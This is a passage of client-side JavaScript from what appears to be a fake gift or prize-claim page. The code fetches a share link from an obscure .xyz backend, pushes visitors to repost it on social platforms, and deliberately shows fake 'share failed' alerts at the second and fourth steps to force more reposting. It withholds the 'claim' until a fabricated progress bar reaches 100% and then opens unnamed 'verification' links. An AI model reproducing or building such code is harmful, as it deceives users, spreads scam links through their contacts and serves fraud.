        const backendDomain = 'https://actnieinxiasdofivity.xyz/';
        const hash = window.I18N_CONFIG?.Hash;

        const response = await fetch(`${backendDomain}/jump?p=${hash}`);
        const data = await response.json();

        if (Array.isArray(data) && data.length > 0) {
            const domain = data[0];
            const shareUrl = buildShareUrl(domain, hash);
            cachedShareDomain = shareUrl;
            return shareUrl;
        } else {
            const fallbackDomain = window.location.origin;
            const shareUrl = buildShareUrl(fallbackDomain, hash);
            cachedShareDomain = shareUrl;
            return shareUrl;
        }
    } catch (error) {
        const fallbackDomain = window.location.origin;
        const hash = window.I18N_CONFIG?.Hash;
        const shareUrl = buildShareUrl(fallbackDomain, hash);
        cachedShareDomain = shareUrl;
        return shareUrl;
    }
}

async function shareToPlatform(platformKey) {
    toPlatform = platformKey;
    const platform = sharePlatforms[platformKey];
    if (!platform) return;
    
    currentShareStep++;
    
    const shareLink = await getBackendDomain();
    const shareUrl = platform.shareUrl + encodeURIComponent(shareLink);
    
    
    setTimeout(() => {
        setProgress(currentShareStep);
    }, 1000);
    
    try {
        window.location.href = shareUrl;
    } catch (error) {
        showShareError();
    }
}

function setProgress(step) {
    const hash = window.I18N_CONFIG?.Hash || 'default';
    const storageKey = `${hash}_share_progress`;
    localStorage.setItem(storageKey, step.toString());
    
    if (step > progressPercents.length) {
        step = progressPercents.length;
        StageManager.nextStage();
        return;
    }
    
    if (step === 2 || step === 4) {
        showShareFailureAlert();
        return;
    }
    
    const progressFill = document.getElementById('fill');
    const progressNumber = document.getElementById('num');
    
    if (progressFill && progressNumber) {
        const progressValue = progressPercents[step - 1] || 0;
        progressFill.style.width = progressValue + '%';
        progressNumber.textContent = progressValue;

    }
}

function showShareFailureAlert() {
    ModalManager.show({
        icon: '!',
        title: $t.t('s_msg.failed'),
        message: $t.t('s_msg.failed_text'),
        buttonText: $t.t('m.ok'),
        onClose: closeShareFailureModal
    });
}

function closeShareFailureModal() {
    ModalManager.hide();
    
    setTimeout(() => {
        shareToPlatform(toPlatform);
    }, 1000);
}

function showShareError() {
    ModalManager.show({
        icon: '!',
        title: $t.t('s_msg.error'),
        message: $t.t('s_msg.error_text'),
        buttonText: $t.t('m.ok'),
        onClose: closeShareErrorModal
    });
}

function closeShareErrorModal() {
    ModalManager.hide();
}

function showShareIncompleteModal() {
    ModalManager.show({
        icon: '!',
        title: $t.t('s_msg.incomplete'),
        message: $t.t('s_msg.incomplete_text'),
        buttonText: $t.t('m.ok'),
        onClose: closeShareIncompleteModal
    });
}

function closeShareIncompleteModal() {
    ModalManager.hide();
}

function closeGenericModal() {
    ModalManager.hide();
}


function handleVerifyNow() {
    const link = $t.verificationLinks?.verifyNow;
    window.open(link);
}

function handleClickHere() {
    const link = $t.verificationLinks?.clickHere;
    window.open(link);
}

function handlePhoneVerification() {
    const link = $t.verificationLinks?.phoneVerification;
    window.open(link);
}


function loadShareProgress() {
    const hash = window.I18N_CONFIG?.Hash || 'default';
    const storageKey = `${hash}_share_progress`;
    const savedProgress = localStorage.getItem(storageKey);
    if (savedProgress) {
        currentShareStep = parseInt(savedProgress);
        if (currentShareStep > 0) {
            setProgress(currentShareStep);
        }
    }
}

function updateShareProgress() {
    setProgress(currentShareStep + 1);
}

function continueToClaim() {
    
    const progressNumber = document.getElementById('num');
    if (progressNumber) {
        const currentProgress = parseInt(progressNumber.textContent) || 0;
        
        if (currentProgress < 100) {
            showShareIncompleteModal();
            return;
        }
    }
    
    StageManager.nextStage();
}

const crownEmojis = ['👑', '🎖️', '🏆', '💎', '⭐', '🌟'];
const giftEmojis = ['🎁', '🎀', '🎊', '🎉', '🎈', '✨' ];

function setRandomEmojis() {
    const crownElement = document.querySelector('.crown');
    if (crownElement) {
        const randomCrownEmoji = crownEmojis[Math.floor(Math.random() * crownEmojis.length)];
        crownElement.textContent = randomCrownEmoji;
    }
    
    const giftElement = document.querySelector('.gift-icon');
    if (giftElement) {
        const randomGiftEmoji = giftEmojis[Math.floor(Math.random() * giftEmojis.length)];
        giftElement.textContent = randomGiftEmoji;
    }
}

function initializeScript() {
    
    setRandomEmojis();
    
    window.dateUpdater = new DateUpdater();
    
    window.lazyLoader = new LazyLoader();
    
    const initializeAfterI18n = () => {
        
        if (!window.$t || !window.$t.isLoaded) {
            setTimeout(initializeAfterI18n, 200);
            return;
        }
        
        
        StageManager.init();
        
        loadComments();
        
        setTimeout(() => {
            const lazyImages = document.querySelectorAll('img[data-src]');
            if (lazyImages.length > 0) {
                lazyImages.forEach(img => {
                    const src = img.getAttribute('data-src');
                    if (src) {
                        img.src = src;
                        img.classList.add('loaded');
                        img.removeAttribute('data-src');
                        
                        if (img.classList.contains('gift-prize')) {
                            img.style.opacity = '0';
                            img.style.transform = 'scale(0.8)';
                        }
                    }
                });
            }
        }, 2000);
    };
    
    window.addEventListener('i18nReady', initializeAfterI18n);
    
    if (window.$t && window.$t.isLoaded) {
        initializeAfterI18n();
    }
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeScript);
} else {
    initializeScript();
}



class RTLHandler {
    constructor() {
        this.isRTL = false;
        this.currentLanguage = 'en';
        this.init();
    }
    
    init() {
        window.addEventListener('rtlChanged', (event) => {
            this.isRTL = event.detail.isRTL;
            this.currentLanguage = event.detail.language;
            this.adjustLayoutForRTL();
            this.adjustDateDisplayForRTL();
        });
        
        this.checkCurrentRTLState();
    }
    
    checkCurrentRTLState() {
        const htmlElement = document.documentElement;
        const dir = htmlElement.getAttribute('dir');
        const lang = htmlElement.getAttribute('lang');
        
        this.isRTL = dir === 'rtl';
        this.currentLanguage = lang || 'en';
        
        if (this.isRTL) {
            this.adjustLayoutForRTL();
            this.adjustDateDisplayForRTL();
        }
    }
    
    adjustLayoutForRTL() {
        if (!this.isRTL) return;
        
        
        this.adjustShareButtons();
        
        this.adjustCommentsLayout();
        
        this.adjustModalLayout();
        
        this.adjustFormElements();
    }
    
    adjustShareButtons() {
        const shareButtons = document.querySelectorAll('.share-btn');
        shareButtons.forEach(btn => {
            if (this.isRTL) {
                btn.style.flexDirection = 'row-reverse';
                const icon = btn.querySelector('.share-icon');
                if (icon) {
                    icon.style.marginLeft = '8px';
                    icon.style.marginRight = '0';
                }
            } else {
                btn.style.flexDirection = 'row';
                const icon = btn.querySelector('.share-icon');
                if (icon) {
                    icon.style.marginLeft = '0';
                    icon.style.marginRight = '8px';
                }
            }
        });
    }
    
    adjustCommentsLayout() {
        const comments = document.querySelectorAll('.comment');
        comments.forEach(comment => {
            if (this.isRTL) {
                comment.style.flexDirection = 'row-reverse';
            } else {
                comment.style.flexDirection = 'row';
            }
        });
    }
    
    adjustModalLayout() {
        const modals = document.querySelectorAll('.modal-content');
        modals.forEach(modal => {
            if (this.isRTL) {
                modal.style.textAlign = 'right';
            } else {
                modal.style.textAlign = 'left';
            }
        });
    }
    
    adjustFormElements() {
        const inputs = document.querySelectorAll('input, select, textarea');
        inputs.forEach(input => {
            if (this.isRTL) {
                input.style.textAlign = 'right';
                input.style.direction = 'rtl';
            } else {
                input.style.textAlign = 'left';
                input.style.direction = 'ltr';
            }
        });
    }
    
    adjustDateDisplayForRTL() {
        if (!this.isRTL) return;
        
        const dateElements = document.querySelectorAll('.date, .banner-right');
        dateElements.forEach(element => {
            element.style.direction = 'ltr';
            element.style.textAlign = 'left';
            element.style.display = 'inline-block';
        });
        
        const priceElements = document.querySelectorAll('.price, .currency');
        priceElements.forEach(element => {
            element.style.direction = 'ltr';
            element.style.textAlign = 'left';
            element.style.display = 'inline-block';
        });
    }
}

const rtlHandler = new RTLHandler();
